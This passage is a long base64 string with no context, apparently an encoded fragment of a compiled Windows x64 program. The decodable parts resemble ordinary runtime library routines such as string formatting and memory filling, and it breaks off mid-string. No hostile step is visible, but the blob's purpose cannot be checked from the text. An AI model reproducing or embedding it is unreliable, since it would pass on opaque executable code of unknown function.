bQEAAIv+SAP/i0T7BEw7+A+CqgAAAItE+whMO/gPg50AAACDfPsQAA+EkgAAAIN8+wwBdBeLRPsMSI1MJDBJA8RJi9X/0IXAeH1+dIF9AGNzbeB1KEiDPY1LBQAAdB5IjQ2ESwUA6A+sAQCFwHQOugEAAABIi83/FW1LBQCLTPsQQbgBAAAASQPMSYvV6NgJAABJi0ZATIvFi1T7EEmLzUSLTQBJA9RIiUQkKEmLRihIiUQkIP8Vr8QBAOjaCQAA/8bpNf///zPA6agAAABJi3YgQYt+SEkr9OmJAAAAi89IA8mLRMsETDv4cnmLRMsITDv4c3D2RQQgdERFM8mF0nQ4RYvBTQPAQotEwwRIO/ByIEKLRMMISDvwcxaLRMsQQjlEwxB1C4tEywxCOUTDDHQIQf/BRDvKcshEO8p1MotEyxCFwHQHSDvwdCXrF41HAUmL1UGJRkhEi0TLDLEBTQPEQf/Q/8eLEzv6D4Jt////uAEAAABMjVwkQEmLWzBJi2s4SYtzQEmL40FfQV5BXUFcX8PMzEiD7Cjo+woAAOgOCAAA6HEKAACEwHUEMsDrF+gACgAAhMB1B+ijCgAA6+zorP3//7ABSIPEKMPMSIPsKOg3CQAASIXAD5XASIPEKMNIg+woM8no0QgAALABSIPEKMPMzEBTSIPsIIrZ6IP9//+E23UR6OoJAADoUQoAADPJ6NIHAACwAUiDxCBbw8zMSIPsKOjLCQAAsAFIg8Qow0BTSIPsIP8VJMMBAEiFwHQTSIsYSIvI6Mz9AABIi8NIhdt17UiDxCBbw8zMzMzMzMzMzMzMzMzMzMzMzMzMZmYPH4QAAAAAAEyL2Q+20km5AQEBAQEBAQFMD6/KSYP4EA+GAgEAAGZJD27BZg9gwEmB+IAAAAAPhnwAAAAPuiWoNgUAAXMii8JIi9dIi/lJi8jzqkiL+kmLw8NmZmZmZmYPH4QAAAAAAA8RAUwDwUiDwRBIg+HwTCvBTYvIScHpB3Q2Zg8fRAAADykBDylBEEiBwYAAAAAPKUGgDylBsEn/yQ8pQcAPKUHQDylB4GYPKUHwddRJg+B/TYvIScHpBHQTDx+AAAAAAA8RAUiDwRBJ/8l19EmD4A90BkEPEUQI8EmLw8OucgIAq3ICANdyAgCncgIAtHICAMRyAgDUcgIApHICANxyAgC4cgIA8HICAOByAgCwcgIAwHICANByAgCgcgIA+HICAEmL0UyNDXaN/f9Di4SBPHICAEwDyEkDyEmLw0H/4WaQSIlR8YlR+WaJUf2IUf/DkEiJUfSJUfzDSIlR94hR/8NIiVHziVH7iFH/ww8fRAAASIlR8olR+maJUf7DSIkQw0iJEGaJUAiIUArDDx9EAABIiRBmiVAIw0iJEEiJUAjDSIlcJAhIiWwkEEiJdCQYV0FUQVVBVkFXSIPsIEUz/0SL8U2L4TPASYvoTI0Nz4z9/0yL6vBPD7G88XCoBwBMiwXT/AQASIPP/0GLyEmL0IPhP0gz0EjTykg71w+ESAEAAEiF0nQISIvC6T0BAABJO+wPhL4AAACLdQAzwPBND7G88VCoBwBIi9h0Dkg7xw+EjQAAAOmDAAAATYu88dg5BAAz0kmLz0G4AAgAAP8VZsABAEiL2EiFwHQFRTP/6yT/FbvBAQCD+Fd1E0UzwDPSSYvP/xVAwAEASIvY691FM/9Bi99MjQ0WjP3/SIXbdQ1Ii8dJh4TxUKgHAOslSIvDSYeE8VCoBwBIhcB0EEiLy/8V48ABAEyNDeSL/f9Ihdt1XUiDxQRJO+wPhUn///9MiwXj+wQASYvfSIXbdEpJi9VIi8v/FbfAAQBMiwXI+wQASIXAdDJBi8i6QAAAAIPhPyvRispIi9BI08pIjQ2Pi/3/STPQSoeU8XCoBwDrLUyLBZP7BADrsblAAAAAQYvAg+A/K8hI089IjQ1ii/3/STP4Soe88XCoBwAzwEiLXCRQSItsJFhIi3QkYEiDxCBBX0FeQV1BXF/DSIvESIlYCEiJaBBIiXAYSIl4IEFWSIPsIEmL+UmL8EiL6kyNDbfFAQBMi/FMjQWpxQEASI0VpsUBADPJ6Pf9//9Ii9hIhcB0GEiLyOjn8f//TIvPTIvGSIvVSYvO/9PrBbgyAAAASItcJDBIi2wkOEiLdCRASIt8JEhIg8QgQV7DzMzMSIvESIlYCEiJaBBIiXAYSIl4IEFWSIPsIEGL+UmL8IvqTI0NSMUBAEyL8UyNBTrFAQBIjRU7xQEAuQEAAADocf3//0iL2EiFwHQXSIvI6GHx//9Ei89Mi8aL1UmLzv/T6wW4MgAAAEiLXCQwSItsJDhIi3QkQEiLfCRISIPEIEFew8zMSIlcJAhXSIPsIEiL+UyNDfTEAQC5AgAAAEyNBeTEAQBIjRXhxAEA6AT9//9Ii9hIhcB0D0iLyOj08P//SIvP/9PrBbgyAAAASItcJDBIg8QgX8PMSIvESIlYCEiJaBBIiXAYSIl4IEFWSIPsMEmL+UmL8EiL6kyNDZ/EAQBMi/FMjQWRxAEASI0VksQBALkDAAAA6Jj8//9Ii9hIhcB0KkiLyOiI8P//SItMJGhMi89IiUwkKEyLxotMJGBIi9WJTCQgSYvO/9PrBbgyAAAASItcJEBIi2wkSEiLdCRQSIt8JFhIg8QwQV7DzMxIiVwkCFdIg+wgSIv5TI0NQMQBALkEAAAATI0FLMQBAEiNFS3EAQDoGPz//0iL2EiFwHQPSIvI6Ajw//9Ii8//0+sG/xUzvQEASItcJDBIg8QgX8NIiVwkCFdIg+wgi9lMjQ0FxAEAuQUAAABMjQXxwwEASI0V8sMBAOjF+///SIv4SIXAdA5Ii8jote///4vL/9frCIvL/xXHvAEASItcJDBIg8QgX8NIiVwkCFdIg+wgi9lMjQ3BwwEAuQYAAABMjQWtwwEASI0VrsMBAOhx+///SIv4SIXAdA5Ii8joYe///4vL/9frCIvL/xWDvAEASItcJDBIg8QgX8NIiVwkCEiJdCQQV0iD7CBIi9pMjQ1/wwEAi/lIjRV2wwEAuQcAAABMjQViwwEA6BX7//9Ii/BIhcB0EUiLyOgF7///SIvTi8//1usLSIvTi8//FRm8AQBIi1wkMEiLdCQ4SIPEIF/DzEiJXCQISIlsJBBIiXQkGFdIg+wgQYvoTI0NKsMBAIvaTI0FGcMBAEiL+UiNFRfDAQC5CAAAAOil+v//SIvwSIXAdBRIi8jole7//0SLxYvTSIvP/9brC4vTSIvP/xW+uwEASItcJDBIi2wkOEiLdCRASIPEIF/DzEiJfCQISIsVdPcEAEiNPcUvBQCLwrlAAAAAg+A/K8gzwEjTyLkJAAAASDPC80irSIt8JAjDzMzMhMl1OVNIg+wgSI0dcC8FAEiLC0iFyXQQSIP5/3QG/xUEvAEASIMjAEiDwwhIjQVtLwUASDvYddhIg8QgW8PMzMzMzMzMzGZmDx+EAAAAAABIgezYBAAATTPATTPJSIlkJCBMiUQkKOiGpAEASIHE2AQAAMPMzMzMzMxmDx9EAABIiUwkCEiJVCQYRIlEJBBJx8EgBZMZ6wjMzMzMzMxmkMPMzMzMzMxmDx+EAAAAAADDzMzMSIPsKEiFyXQRSI0FLC8FAEg7yHQF6GL1AABIg8Qow8xAU0iD7CBIi9mLDc32BACD+f90M0iF23UO6KL9//+LDbj2BABIi9gz0ujm/f//SIXbdBRIjQXiLgUASDvYdAhIi8voFfUAAEiDxCBbw8zMzEiJXCQISIl0JBBXSIPsIIM9dvYEAP91BDPA63n/FWq7AQCLDWT2BACL8OhB/f//M/9Ii9hIhcB0DYvO/xUjvAEASIvD60+6eAAAAI1KiegR9gAASIvYSIXAdQSLzusUiw0n9gQASIvQ6Ff9//+LzoXAdQj/Feu7AQDrD/8V47sBAEiLy0iL30iL+UiLy+h69AAASIvHSItcJDBIi3QkOEiDxCBfw8zMzEiD7ChIjQ3d/v//6BD8//+JBc71BACD+P91BDLA6xtIjRX+LQUAi8jo7/z//4XAdQfoCgAAAOvjsAFIg8Qow8xIg+woiw2a9QQAg/n/dAzoIPz//4MNifUEAP+wAUiDxCjDzMxAU0iD7CAz20iNFSkuBQBFM8BIjQybSI0MyrqgDwAA6Pz8//+FwHQR/wUyLgUA/8OD+wFy07AB6wfoCgAAADLASIPEIFvDzMxAU0iD7CCLHQwuBQDrHUiNBdstBQD/y0iNDJtIjQzI/xWTuAEA/w3tLQUAhdt137ABSIPEIFvDzEiLFZH0BAC5QAAAAIvCg+A/K8gzwEjTyEgzwkiJBcYtBQDDzEiJXCQITIlMJCBXSIPsIEmL2UmL+EiLCuiPOQAAkEiLz+i2CAAAi/hIiwvoiDkAAIvHSItcJDBIg8QgX8PMzMxIiVwkCFVWV0FWQVdIjawk8Pv//0iB7BAFAABIiwUS9AQASDPESImFAAQAAEmL2UmL+EiL8kyL+U2FyXUY6Hr6AADHABYAAADoq/YAAIPI/+kKAQAATYXAdAVIhdJ03kiLlWAEAABIjUwkWOicBwAAM9JIjUwkMESNQiDo/PT//0iDZCRAAE2L90iJdCQwSIl8JDhBg+YCdQpEiHQkSEiF9nUFxkQkSAFIjUQkMEyLy0iJRCRQSI1UJFBIi4VoBAAASI1NgEiJRCQoTYvHSI1EJGBIiUQkIOg0BgAASI1NgOgbCgAASGPYSIX2dElB9scBdCJIhf91CIXAD4WKAAAASItEJEBIO8d1KIXbeChIO992I+t1TYX2dGtIhf90F4XAeQXGBgDrDkiLRCRASDvHdGzGBAYASIuN4AMAAOja8QAASIOl4AMAAACAfCRwAHQMSItMJFiDoagDAAD9i8NIi40ABAAASDPM6I6dAQBIi5wkQAUAAEiBxBAFAABBX0FeX15dw0iF/3UFg8v/66dIi0QkQEg7x3WZu/7////GRD7/AOuRzMzMSIlcJAhIiXQkIFVXQVRBVkFXSI2sJPD7//9IgewQBQAASIsFZPIEAEgzxEiJhQAEAABFM+RJi9lJi/hIi/JMi/lNhcl1GOjJ+AAAxwAWAAAA6Pr0AACDyP/pCgEAAE2FwHQFSIXSdN5Ii5VgBAAASI1MJFjo6wUAADPSSI1MJDBEjUIg6Evz//9Ni/dIiXQkMEiJfCQ4TIlkJEBBg+YCdQpEiGQkSEiF9nUFxkQkSAFIjUQkMEyLy0iJRCRQSI1UJFBIi4VoBAAASI1NgEiJRCQoTYvHSI1EJGBIiUQkIOgABQAASI1NgOj3DAAASGPYSIX2dEtB9scBdCJIhf91CIXAD4WQAAAASItEJEBIO8d1KYXbeCpIO992Jet7TYX2dHFIhf90GYXAeQZmRIkm6w9Ii0QkQEg7x3RxZkSJJEZIi43gAwAA6CjwAABMiaXgAwAARDhkJHB0DEiLTCRYg6GoAwAA/YvDSIuNAAQAAEgzzOjdmwEATI2cJBAFAABJi1swSYtzSEmL40FfQV5BXF9dw0iF/3UFg8v/66NIi0QkQEg7x3WUu/7///9mRIlkfv7rjEiJXCQISIlsJBBIiXQkGFdIg+wgSIPI/0iL8jPSSIvpSPf2SIPg/kiD+AJzD+gu9wAAxwAMAAAAMsDrW0gD9jP/SDm5CAQAAHUNSIH+AAQAAHcEsAHrQEg7sQAEAAB280iLzuiY7wAASIvYSIXAdB1Ii40IBAAA6ETvAABIiZ0IBAAAQLcBSIm1AAQAADPJ6CzvAABAisdIi1wkMEiLbCQ4SIt0JEBIg8QgX8NBi8iD6QJ0JIPpAXQcg/kJdBdBg/gNdBSA6mP2wu8PlMEzwITJD5TAw7ABwzLAw8xFi8hMi9FBg+kCdDVBg+kBdCxBg/kJdCZBg/gNdCBBwOoCZoPqY0GA4gG47/8AAGaF0A+UwTPARDrRD5TAw7ABwzLAw0iJXCQISI1BWEyL0UiLiAgEAABBi9hIhclEi9pID0TISIO4CAQAAAB1B7gAAgAA6wpIi4AABAAASNHoTI1B/0wDwE2JQkhBi0I4hcB/BUWF23Q2/8gz0kGJQjhBi8P384DCMESL2ID6OX4SQYrB9tgayYDh4IDBYYDpOgLRSYtCSIgQSf9KSOu9RStCSEn/QkhIi1wkCEWJQlDDzEiJXCQISI1BWEGL2EyL0UyL2kiLiAgEAABIhclID0TISIO4CAQAAAB1B7gAAgAA6wpIi4AABAAASNHoTI1B/0wDwE2JQkhBi0I4hcB/BU2F23Q3/8gz0kGJQjhJi8NI9/OAwjBMi9iA+jl+EkGKwfbYGsmA4eCAwWGA6ToC0UmLQkiIEEn/SkjrvEUrQkhJ/0JISItcJAhFiUJQw0WFwA+OhAAAAEiLxEiJWAhIiWgQSIlwGEiJeCBBVkiD7CBJi9lED77yQYvoSIvxM/9IiwaLSBTB6Qz2wQF0CkiLBkiDeAgAdBZIixZBD7fO6DsNAQC5//8AAGY7wXQR/wOLA4P4/3QL/8c7/X0F68GDC/9Ii1wkMEiLbCQ4SIt0JEBIi3wkSEiDxCBBXsPMzEiJXCQIRTPbSIvZRYXAfkVMixNJi0IISTlCEHUSQYB6GAB0BUH/AeseQYMJ/+sYQf8BSIsDSP9AEEiLA0iLCIgRSIsDSP8AQYM5/3QIQf/DRTvYfLtIi1wkCMPMRYXAfmhIiVwkCEiJfCQQQIr6SIvZRTPbTIsTSYtCCEk5QhB1EkGAehgAdAVB/wHrJEGDCf/rHkH/AUiLA0APvtdI/0AQSIsDSIsIZokRSIsDSIMAAkGDOf90CEH/w0U72Hy1SItcJAhIi3wkEMPMzEBTSIPsIEiL2TPJSIkLSIlLCEiJSxhIiUsgSIlLEEiJSyhIiUswiUs4ZolLQIlLUIhLVEiJi1gEAABIiYtgBAAASIsCSImDaAQAAEiLRCRQSIlDCEiLRCRYSIlDIEyJA0yJSxiJi3AEAADoPfMAAEiJQxBIi8NIg8QgW8NAU0iD7CBIi9kzyUiJC0iJSwhIiUsYSIlLIEiJSxBIiUsoSIlLMIlLOIhLQGaJS0KJS1CIS1RIiYtYBAAASImLYAQAAEiLAkiJg2gEAABIi0QkUEiJQwhIi0QkWEiJQyBMiQNMiUsYiYtwBAAA6L7yAABIiUMQSIvDSIPEIFvDzEiJXCQIV0iD7CDGQRgASIv5SIXSdAUPEALrEYsFlyYFAIXAdQ4PEAXs7gQA8w9/QQjrT+iI/AAASIkHSI1XCEiLiJAAAABIiQpIi4iIAAAASIlPEEiLyOj4/QAASIsPSI1XEOgg/gAASIsPi4GoAwAAqAJ1DYPIAomBqAMAAMZHGAFIi8dIi1wkMEiDxCBfw0iJXCQQSIl0JBhXSIHs8AQAAEiLBX/rBABIM8RIiYQk4AQAAEiLAUiL2UiLOEiLz+gfDAEASItTCEiNTCQ4QIrwSIsS6Cf///9IixNIjUQkQEiLSyBMi0sYTIsCSI1UJDBIiwlNiwlMiUQkMEyLQxBIiUwkKEiNTCRgSIlEJCBNiwDoaf7//0iNTCRg6OcDAABIi4wkwAQAAIvY6ODpAABIg6QkwAQAAACAfCRQAHQMSItMJDiDoagDAAD9SIvXQIrO6F0MAQCLw0iLjCTgBAAASDPM6IeVAQBMjZwk8AQAAEmLWxhJi3MgSYvjX8PMzEiJXCQIV0iD7CBIi9lIi/oPvgnoNPAAAIP4ZXQPSP/DD7YL6KztAACFwHXxD74L6BjwAACD+Hh1BEiDwwJIiweKE0iLiPgAAABIiwGKCIgLSP/DigOIE4rQigNI/8OEwHXxSItcJDBIg8QgX8PMzMxIi8RIiVgQSIloGFZXQVZIg+wgSItxEEiL+b0BAAAASIvaSI1QCESLNoMmAESNRQlIi0kYSINgCABIK83op9kAAIkDSItHEIM4InQRSItEJEBIO0cYcgZIiUcY6wNAMu2DPgB1CEWF9nQDRIk2SItcJEhAisVIi2wkUEiDxCBBXl9ew8xIi8RIiVgQSIloGEiJcCBXSIPsIEiLcRBIi/lIi9pBuAoAAABIjVAIiy6DJgBIi0kYSINgCABIg+kC6IXZAACJA0iLRxCDOCJ0E0iLRCQwSDtHGHIISIlHGLAB6wIywIM+AHUGhe10AokuSItcJDhIi2wkQEiLdCRISIPEIF/DzEiJXCQISIlsJBBIiXQkGFdIg+wgM/ZIi9lIObFoBAAAdRjole8AAMcAFgAAAOjG6wAAg8j/6a8BAABIOXEYdOL/gXAEAACDuXAEAAACD4STAQAAg8//SI0tL74BAIlzUIlzLOlLAQAASP9DGDlzKA+MUwEAAIpDQYtTLCwgPFp3D0gPvkNBD7ZMKOCD4Q/rAovOjQTKA8iLwQ+2DCnB6QSJSyyD+QgPhFIBAACFyQ+E8wAAAIPpAQ+E1gAAAIPpAQ+EmAAAAIPpAXRng+kBdFqD6QF0KIPpAXQWg/kBD4UrAQAASIvL6HUOAADpvwAAAEiLy+ikCQAA6bIAAACAe0EqdBFIjVM4SIvL6O39///pmwAAAEiDQyAISItDIItI+IXJD0jPiUs46zCJczjpgQAAAIB7QSp0BkiNUzTryUiDQyAISItDIItI+IlLNIXJeQmDSzAE99mJSzSwAetRikNBPCB0KDwjdB48K3QUPC10CjwwdT6DSzAI6ziDSzAE6zKDSzAB6yyDSzAg6yaDSzAC6yBIiXMwQIhzQIl7OIlzPECIc1TrDEiLy+jhBwAAhMB0W0iLQxiKCIhLQYTJD4Wk/v//SP9DGDlzLHQGg3ssB3Ur/4NwBAAAg7twBAAAAg+Fd/7//4tDKEiLXCQwSItsJDhIi3QkQEiDxCBfw+i57QAAxwAWAAAA6OrpAACLx+vXzMxIi8RIiVgISIlwEEiJeBhMiXAgQVdIg+wgM/ZIi9lIObFoBAAAdRjofO0AAMcAFgAAAOit6QAAg8j/6QcCAABIOXEYdOL/gXAEAACDuXAEAAACD4TrAQAAg8//TI09trsBAESNdyGJc1CJcyzppgEAAEiDQxgCOXMoD4yxAQAAD7dDQotTLGZBK8Zmg/hadw8Pt0NCQg+2TDjgg+EP6wKLzo0EykIPtgQ4wegEiUMsg/gID4SpAQAAhcAPhAcBAACD6AEPhOoAAACD6AEPhKIAAACD6AF0a4PoAXReg+gBdCiD6AF0FoP4AQ+FggEAAEiLy+jRDgAA6RcBAABIi8voAAkAAOkKAQAAZoN7Qip0EUiNUzhIi8voUPz//+nyAAAASINDIAhIi0Mgi0j4hckPSM+JSzjp1wAAAIlzOOnVAAAAZoN7Qip0BkiNUzTrxUiDQyAISItDIItI+IlLNIXJD4mrAAAAg0swBPfZiUs06Z0AAAAPt0NCQTvGdDCD+CN0JYP4K3Qag/gtdA+D+DAPhYIAAACDSzAI63yDSzAE63aDSzAB63BECXMw62qDSzAC62RIiXMwQIhzQIl7OIlzPECIc1TrUEQPt0NCxkNUAUiLg2gEAACLSBTB6Qz2wQF0DUiLg2gEAABIOXAIdB9Ii5NoBAAAQQ+3yOgxBAEAuf//AABmO8F1BYl7KOsD/0MosAGEwHRaSItDGA+3CGaJS0JmhckPhUb+//9Ig0MYAv+DcAQAAIO7cAQAAAIPhSP+//+LQyhIi1wkMEiLdCQ4SIt8JEBMi3QkSEiDxCBBX8PoQusAAMcAFgAAAOhz5wAAi8fr0czMzEiLxEiJWAhIiWgQSIlwGEiJeCBBVkiD7CAz9kiL2Ug5sWgEAAB1GOgE6wAAxwAWAAAA6DXnAACDyP/pGAIAAEg5cRh04v+BcAQAAIO5cAQAAAIPhPwBAACDz/9MjTWeuQEAjW8hiXNQiXMs6a0BAABIg0MYAjlzKA+MuAEAAA+3Q0KLUyxmK8Vmg/hadw8Pt0NCQg+2TDDgg+EP6wKLzo0EygPIQg+2DDHB6QSJSyyD+QgPhLoBAACFyQ+ECAEAAIPpAQ+E6wAAAIPpAQ+EogAAAIPpAXRrg+kBdF6D6QF0KIPpAXQWg/kBD4WTAQAASIvL6CUPAADpHQEAAEiLy+gsCAAA6RABAABmg3tCKnQRSI1TOEiLy+jY+f//6fgAAABIg0MgCEiLQyCLSPiFyQ9Iz4lLOOndAAAAiXM46dsAAABmg3tCKnQGSI1TNOvFSINDIAhIi0Mgi0j4iUs0hckPibEAAACDSzAE99mJSzTpowAAAA+3Q0I7xXQyg/gjdCiD+Ct0HYP4LXQSg/gwD4WJAAAAg0swCOmAAAAAg0swBOt6g0swAet0CWsw62+DSzAC62lIiXMwQIhzQIl7OIlzPECIc1TrVQ+3U0LGQ1QBSIuLaAQAAEiLQQhIOUEQdRBAOHEYdAX/QyjrK4l7KOsm/0MoSIuDaAQAAEj/QBBIi4NoBAAASIsIZokRSIuDaAQAAEiDAAKwAYTAdGVIi0MYD7cIZolLQmaFyQ+FP/7//0iDQxgCOXMsdAaDeywHdTH/g3AEAACDu3AEAAACD4UR/v//i0MoSItcJDBIi2wkOEiLdCRASIt8JEhIg8QgQV7D6LnoAADHABYAAADo6uQAAIvH69HMzEiLxEiJWAhIiWgQSIlwGEiJeCBBVkiD7CAz9kiL2Ug5sWgEAAB1GOh86AAAxwAWAAAA6K3kAACDyP/pCwIAAEg5cRh04v+BcAQAAIO5cAQAAAIPhO8BAACDz/9MjTW2tgEAjW8hiXNQiXMs6asBAABIg0MYAjlzKA+MtgEAAA+3Q0KLUyxmK8Vmg/hadw8Pt0NCQg+2TDDgg+EP6wKLzo0EykIPtgQwwegEiUMsg/gID4SvAQAAhcAPhAgBAACD6AEPhOsAAACD6AEPhKIAAACD6AF0a4PoAXReg+gBdCiD6AF0FoP4AQ+FiAEAAEiLy+ifDAAA6R0BAABIi8vopgUAAOkQAQAAZoN7Qip0EUiNUzhIi8voUvf//+n4AAAASINDIAhIi0Mgi0j4hckPSM+JSzjp3QAAAIlzOOnbAAAAZoN7Qip0BkiNUzTrxUiDQyAISItDIItI+IlLNIXJD4mxAAAAg0swBPfZiUs06aMAAAAPt0NCO8V0MoP4I3Qog/grdB2D+C10EoP4MA+FiQAAAINLMAjpgAAAAINLMATreoNLMAHrdAlrMOtvg0swAutpSIlzMECIc0CJeziJczxAiHNU61UPt1NCxkNUAUiLi2gEAABIi0EISDlBEHUQQDhxGHQF/0Mo6yuJeyjrJv9DKEiLg2gEAABI/0AQSIuDaAQAAEiLCGaJEUiLg2gEAABIgwACsAGEwHRaSItDGA+3CGaJS0JmhckPhUH+//9Ig0MYAv+DcAQAAIO7cAQAAAIPhR7+//+LQyhIi1wkMEiLbCQ4SIt0JEBIi3wkSEiDxCBBXsPoPuYAAMcAFgAAAOhv4gAAi8fr0czMzEBTSIPsIDPSSIvZ6GQAAACEwHRISIuLaAQAAESKQ0FIi0EISDlBEHURgHkYAHQF/0Mo6ySDSyj/6x7/QyhI/0EQSIuLaAQAAEiLEUSIAkiLi2gEAABI/wGwAesS6MvlAADHABYAAADo/OEAADLASIPEIFvDSIPsKEiLQQhIi9FED7ZBQcZBVAC5AIAAAEiLAEiLAGZChQxAdGhIi4poBAAASItBCEg5QRB1EYB5GAB0Bf9CKOskg0oo/+se/0IoSP9BEEiLgmgEAABIiwhEiAFIi4JoBAAASP8ASItCGIoISP/AiEpBSIlCGITJdRToOeUAAMcAFgAAAOhq4QAAMsDrArABSIPEKMPMzMxIg+woikFBPEZ1GfYBCA+FYAEAAMdBLAcAAABIg8Qo6aAEAAA8TnUn9gEID4VDAQAAx0EsCAAAAOjj5AAAxwAWAAAA6BThAAAywOknAQAAg3k8AHXjPEkPhLoAAAA8TA+EqQAAADxUD4SYAAAAPGh0cjxqdGI8bHQ2PHR0Jjx3dBY8erABD4XrAAAAx0E8BgAAAOnfAAAAx0E8DAAAAOnRAAAAx0E8BwAAAOnFAAAASItBGIA4bHUTSP/Ax0E8BAAAAEiJQRjpqQAAAMdBPAMAAADpnQAAAMdBPAUAAADpkQAAAEiLQRiAOGh1EEj/wMdBPAEAAABIiUEY63jHQTwCAAAA62/HQTwNAAAA62bHQTwIAAAA611Ii1EYigI8M3UXgHoBMnURSI1CAsdBPAoAAABIiUEY6zw8NnUXgHoBNHURSI1CAsdBPAsAAABIiUEY6yEsWDwgdxtID77ASLoBEIIgAQAAAEgPo8JzB8dBPAkAAACwAUiDxCjDzEiD7Chmg3lCRnUZ9gEID4WHAQAAx0EsBwAAAEiDxCjpoAUAAGaDeUJOdSf2AQgPhWcBAADHQSwIAAAA6GTjAADHABYAAADold8AADLA6UsBAACDeTwAdeMPt0FCg/hJD4TPAAAAg/hMD4S9AAAAg/hUD4SrAAAAumgAAAA7wnR8g/hqdGu6bAAAADvCdDmD+HR0KIP4d3QXg/h6sAEPhfoAAADHQTwGAAAA6e4AAADHQTwMAAAA6eAAAADHQTwHAAAA6dQAAABIi0EYZjkQdRRIg8ACx0E8BAAAAEiJQRjptwAAAMdBPAMAAADpqwAAAMdBPAUAAADpnwAAAEiLQRhmORB1FEiDwALHQTwBAAAASIlBGOmCAAAAx0E8AgAAAOt5x0E8DQAAAOtwx0E8CAAAAOtnSItRGA+3AmaD+DN1GGaDegIydRFIjUIEx0E8CgAAAEiJQRjrQmaD+DZ1GGaDegI0dRFIjUIEx0E8CwAAAEiJQRjrJGaD6Fhmg/ggdxoPt8BIugEQgiABAAAASA+jwnMHx0E8CQAAALABSIPEKMPMzEiD7Chmg3lCRnUZ9gEID4WHAQAAx0EsBwAAAEiDxCjpyAYAAGaDeUJOdSf2AQgPhWcBAADHQSwIAAAA6MDhAADHABYAAADo8d0AADLA6UsBAACDeTwAdeMPt0FCg/hJD4TPAAAAg/hMD4S9AAAAg/hUD4SrAAAAumgAAAA7wnR8g/hqdGu6bAAAADvCdDmD+HR0KIP4d3QXg/h6sAEPhfoAAADHQTwGAAAA6e4AAADHQTwMAAAA6eAAAADHQTwHAAAA6dQAAABIi0EYZjkQdRRIg8ACx0E8BAAAAEiJQRjptwAAAMdBPAMAAADpqwAAAMdBPAUAAADpnwAAAEiLQRhmORB1FEiDwALHQTwBAAAASIlBGOmCAAAAx0E8AgAAAOt5x0E8DQAAAOtwx0E8CAAAAOtnSItRGA+3AmaD+DN1GGaDegIydRFIjUIEx0E8CgAAAEiJQRjrQmaD+DZ1GGaDegI0dRFIjUIEx0E8CwAAAEiJQRjrJGaD6Fhmg/ggdxoPt8BIugEQgiABAAAASA+jwnMHx0E8CQAAALABSIPEKMPMzEiJXCQQSIlsJBhIiXQkIFdBVkFXSIPsMA++QUFIi9lBvwEAAACD+GR/XQ+EyAAAAIP4QQ+E0gAAAIP4Q3Qzg/hED47NAAAAg/hHD467AAAAg/hTdF+D+Fh0b4P4WnQeg/hhD4SjAAAAg/hjD4WjAAAAM9Lo/AwAAOmTAAAA6JIHAADpiQAAAIP4Z35/g/hpdGeD+G50W4P4b3Q4g/hwdBuD+HN0D4P4dXRSg/h4dWWNUJjrTeiTEAAA61XHQTgQAAAAx0E8CwAAAEWKx7oQAAAA6zGLSTCLwcHoBUGEx3QHD7rpB4lLMLoIAAAASIvL6xDoeg8AAOsYg0kwELoKAAAARTPA6McNAADrBegECAAAhMB1BzLA6UUBAACAe0AAD4U4AQAAi1MwM8BmiUQkUDP/iEQkUovCwegEQYTHdC6LwsHoBkGEx3QHxkQkUC3rGkGE13QHxkQkUCvrDovC0ehBhMd0CMZEJFAgSYv/iktBjUGoqN91D4vCwegFQYTHdAVFisfrA0UywI1Bv6jfD5TARYTAdQSEwHQqxkQ8UDBJA/+A+Vh0CYD5QXQEMsDrA0GKx/bYGsAk4ARhBBeIRDxQSQP/i3M0K3NQK/f2wgx1FUyNSyhEi8ZIjYtoBAAAsiDo/un//0iLQxBIjWsoTI2zaAQAAEiJRCQgTIvNSI1UJFBJi85Ei8foVxQAAItLMIvBwegDQYTHdBjB6QJBhM91EEyLzUSLxrIwSYvO6LLp//8z0kiLy+hoEAAAg30AAHwbi0MwwegCQYTHdBBMi81Ei8ayIEmLzuiH6f//QYrHSItcJFhIi2wkYEiLdCRoSIPEMEFfQV5fw8zMzEiJXCQQSIlsJBhIiXQkIFdBVEFVQVZBV0iD7EBIiwU11wQASDPESIlEJDgPt0FCvlgAAABIi9mNbulEjX6pg/hkf1sPhMYAAAA7xQ+E0QAAAIP4Q3Qyg/hED47MAAAAg/hHD466AAAAg/hTdF47xnRvg/hadB6D+GEPhKMAAACD+GMPhaMAAAAz0ugdCwAA6ZMAAADofwUAAOmJAAAAg/hnfn+D+Gl0Z4P4bnRbg/hvdDiD+HB0G4P4c3QPg/h1dFKD+Hh1ZY1QmOtN6JAOAADrVcdBOBAAAADHQTwLAAAARYrHuhAAAADrMYtJMIvBwegFQYTHdAcPuukHiUswuggAAABIi8vrEOjnDAAA6xiDSTAQugoAAABFM8DoNAsAAOsF6I0HAACEwHUHMsDpbAEAAIB7QAAPhV8BAACLUzAzwIlEJDAz/2aJRCQ0i8LB6AREjW8gQYTHdDKLwsHoBkGEx3QKjUctZolEJDDrG0GE13QHuCsAAADr7YvC0ehBhMd0CWZEiWwkMEmL/w+3S0JBud//AAAPt8FmK8ZmQYXBdQ+LwsHoBUGEx3QFRYrH6wNFMsAPt8FBvDAAAABmK8VmQYXBD5TARYTAdQSEwHQvZkSJZHwwSQP/ZjvOdAlmO810BDLA6wNBisf22BrAJOAEYQQXD77AZolEfDBJA/+LczQrc1Ar9/bCDHUWTI1LKESLxkiNi2gEAABBitXotub//0iLQxBIjWsoTI2zaAQAAEiJRCQgTIvNSI1UJDBJi85Ei8fokxAAAItLMIvBwegDQYTHdBnB6QJBhM91EUyLzUSLxkGK1EmLzuhp5v//M9JIi8vohw4AAIN9AAB8HItDMMHoAkGEx3QRTIvNRIvGQYrVSYvO6D3m//9BisdIi0wkOEgzzOh1fwEATI1cJEBJi1s4SYtrQEmLc0hJi+NBX0FeQV1BXF/DzMzMSIlcJBBIiWwkGEiJdCQgV0FUQVVBVkFXSIPsQEiLBWnUBABIM8RIiUQkOA+3QUK+WAAAAEiL2Y1u6USNfqmD+GR/Ww+ExgAAADvFD4TRAAAAg/hDdDKD+EQPjswAAACD+EcPjroAAACD+FN0XjvGdG+D+Fp0HoP4YQ+EowAAAIP4Yw+FowAAADPS6FEIAADpkwAAAOizAgAA6YkAAACD+Gd+f4P4aXRng/hudFuD+G90OIP4cHQbg/hzdA+D+HV0UoP4eHVljVCY603oxAsAAOtVx0E4EAAAAMdBPAsAAABFise6EAAAAOsxi0kwi8HB6AVBhMd0Bw+66QeJSzC6CAAAAEiLy+sQ6BsKAADrGINJMBC6CgAAAEUzwOhoCAAA6wXowQQAAITAdQcywOlsAQAAgHtAAA+FXwEAAItTMDPAiUQkMDP/ZolEJDSLwsHoBESNby